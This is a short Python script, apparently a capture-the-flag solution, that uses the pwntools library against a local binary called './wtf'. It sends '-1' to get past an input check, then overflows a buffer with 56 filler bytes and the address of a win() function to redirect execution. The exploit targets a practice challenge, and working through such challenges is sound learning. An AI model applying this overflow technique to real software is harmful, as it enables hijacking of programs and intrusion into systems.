from pwn import *

p = process('./wtf')

p.send('-1\n')
#gdb.attach(p)
# 0x004005f4 win()
p.sendline(b'A'*56 + p64(0x004005f4))
l = p.recvline()
print(l)

